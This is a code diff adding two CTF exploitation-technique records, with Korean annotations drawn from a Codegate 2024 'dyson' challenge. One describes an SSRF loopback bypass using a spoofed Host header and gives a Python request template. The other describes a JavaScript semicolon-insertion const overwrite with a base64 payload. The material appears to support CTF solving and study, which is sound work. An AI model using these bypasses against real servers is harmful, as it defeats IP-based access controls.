@@ -232,6 +232,135 @@ TECHNIQUES: list[dict] = [
             "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
         },
     },
+    {
+        "name": "dyson_multi_request_host_smuggling",
+        "vuln_type": "ssrf_loopback_bypass",
+        "category": "exploitation",
+        "safety_level": "safe",
+        "tags": ["dyson", "ssrf", "host-header", "multi-request", "ip-bypass"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "dyson multiRequest Host-header loopback smuggling",
+            "applies_when": (
+                "Node 서버가 내부적으로 request 를 fan-out 할 때 hostname/port 를 "
+                "클라이언트가 보낸 Host 헤더에서 파싱하는 경우. 특히 dyson-generators 의 "
+                "`multiRequest` 기능 (path fragment 에 ',' 포함 시 split 후 http.get) 에서 "
+                "`req.headers.host.split(':')` 로 target 결정. 이때 Host: localhost:port 로 "
+                "보내면 서버가 자기 자신에게 loopback 요청 → req.socket.remoteAddress=127.0.0.1."
+            ),
+            "prerequisites": [
+                "서버 코드가 `req.socket.remoteAddress` 로 IP 체크 (127.0.0.1 whitelist 등)",
+                "dyson-generators 또는 유사하게 Host 헤더 기반 내부 redirect 가능",
+                "route 가 multiRequest middleware 경유 (dyson 의 default)",
+                "multiRequest delimiter (dyson 기본 ',') 알려져 있음",
+            ],
+            "technique_steps_md": (
+                "1. 서버 코드에서 IP 체크 / internal-only 엔드포인트 식별.\n"
+                "2. 동일 서버의 route 중 multiRequest 지원 middleware 경유하는 것 찾기 "
+                "(dyson 은 모든 route 기본 지원).\n"
+                "3. URL path 에 ',' 포함한 fragment 삽입 — fragment 를 split 후 각 id 로 "
+                "path.replace(arr, id) 해서 loopback http.get.\n"
+                "4. **Host 헤더를 `localhost:<internal_port>` 로 설정** — 서버가 자기 자신에게 "
+                "내부 요청. 그 요청의 remoteAddress = 127.0.0.1.\n"
+                "5. 반드시 적어도 한 sub-request url 이 target route 에 매치되도록 "
+                "`,` 양쪽 조각이 유효 path 가 되게 배치. query string 전달은 `?` 사이에 끼워 "
+                "넣기 (예: `/api/X?guess=V&extra,X?guess=V`).\n"
+            ),
+            "code_template": (
+                "# url template: /<route>?<params>&<pad>,<route_tail>?<params>\n"
+                "# Host header must be 'localhost:<internal_port>'\n"
+                "import urllib.request\n"
+                "req = urllib.request.Request(\n"
+                "    'http://<target>/<route>?<params>&extra,<route_tail>?<params>',\n"
+                "    headers={'Host': 'localhost:<internal_port>'},\n"
+                ")\n"
+                "r = urllib.request.urlopen(req, timeout=10)\n"
+            ),
+            "examples": [
+                {
+                    "problem_id": "2024-dyson",
+                    "captured_flag": "codegate2024{testflag}",
+                    "params": {
+                        "route": "/api/flagService",
+                        "payload_path": (
+                            "/api/flagService?guess=MDAwMA==&extra,flagService?guess=MDAwMA=="
+                        ),
+                        "host_header": "localhost:3000",
+                        "internal_port": 3000,
+                        "bypass_target": "req.socket.remoteAddress == 127.0.0.1 check",
+                    },
+                    "notes": (
+                        "dyson multiRequest: path fragment with ',' → range.split(',') → each "
+                        "id path.replace → http.get({hostname, port from Host header, path}). "
+                        "Host=localhost:3000 → backend loops back to itself, inner handler sees "
+                        "remoteAddress=127.0.0.1."
+                    ),
+                },
+            ],
+            "tags": ["dyson", "ssrf", "host-header", "loopback", "ip-bypass"],
+        },
+    },
+    {
+        "name": "js_asi_const_overwrite",
+        "vuln_type": "js_parser_quirk",
+        "category": "exploitation",
+        "safety_level": "safe",
+        "tags": ["javascript", "asi", "const", "parser-quirk", "nodejs"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "JS Automatic Semicolon Insertion — const literal overwrite",
+            "applies_when": (
+                "JavaScript 소스에서 `const X = \"<value>\"` 뒤에 세미콜론 없이 다음 줄이 "
+                "`[a, b] = expr` 로 시작하는 경우. ASI 는 string literal 다음에 오는 `[` 를 "
+                "member-access 로 해석해서 세미콜론 삽입 안 함 → 전체가 `const X = \"...\"[a,b] = expr` "
+                "한 statement 로 파싱. comma expression `[a,b]` 는 `b` 평가 → "
+                "`\"...\"[b] = expr` 은 string prop 할당 (sloppy mode silent fail), 할당식 값=expr. "
+                "결국 `const X = expr` — 공격자 제어 값으로 const 를 덮어씀."
+            ),
+            "prerequisites": [
+                "분석 가능한 JS 소스 (blackbox 에서는 어려움, 단 소스 유출/writeup 시)",
+                "선언부: `const X = \"literal\"` 뒤에 세미콜론 누락",
+                "바로 다음 줄: `[var1, var2] = <attacker_controlled_expr>`",
+                "sloppy mode (엄격 모드면 TypeError — strict 가 아니어야 함)",
+                "후속 비교: `X == something` 에서 공격자가 expr 값을 양쪽 중 하나와 같게 만들 수 있음",
+            ],
+            "technique_steps_md": (
+                "1. JS 소스에서 `const ... = \"...\"` 뒤 세미콜론 빠진 줄 검색.\n"
+                "2. 다음 줄이 `[...] = <expr>` 패턴이면 `X` 가 expr 로 덮어쓰기됨.\n"
+                "3. 비교 문 (`if (X == target)`) 확인 — target 이 공격자 제어 expr 결과와 "
+                "같게 만들면 체크 우회.\n"
+                "4. JS 동등 비교 (`==`) 의 coercion 활용 — 예: `[\"0000\"] == false` → "
+                "array→string `\"0000\"` → number `0` ↔ `false` → `0` → true.\n"
+                "5. expr 소스 (req.query, req.body 등) 에 payload 주입.\n"
+            ),
+            "code_template": (
+                "// vulnerable source pattern:\n"
+                "//   const TARGET = \"...\"\n"
+                "//   [a, b] = req.query.X !== undefined ? atob(req.query.X).split(\"|\") : [...]\n"
+                "// attacker sends X=<base64> such that after atob+split, compared value == initial false/0/null.\n"
+                "// example: X=MDAwMA== (atob=\"0000\") → TARGET=[\"0000\"] → [\"0000\"] == false → 0==0 → true\n"
+            ),
+            "examples": [
+                {
+                    "problem_id": "2024-dyson",
+                    "captured_flag": "codegate2024{testflag}",
+                    "params": {
+                        "guess": "MDAwMA==",
+                        "atob_decoded": "0000",
+                        "final_compare": "[\"0000\"] == false  -> \"0000\" == 0 -> true",
+                        "overwritten_const": "SuperSecretPassword",
+                    },
+                    "notes": (
+                        "const SuperSecretPassword = \"[REDACTED]\"\\n[guessPassword, guessFlag] = "
+                        "req.query.guess !== undefined ? atob(req.query.guess).split(\"|\") : [...] "
+                        "→ ASI 실패로 한 문장. 공격자가 guess 제어 → SuperSecretPassword 자체가 "
+                        "array 로 덮어짐. 비교 피연산자가 false(초기값) 이므로 array→0 coercion 으로 매치."
+                    ),
+                },
+            ],
+            "tags": ["javascript", "asi", "const", "type-coercion", "nodejs"],
+        },
+    },
 ]
 
 
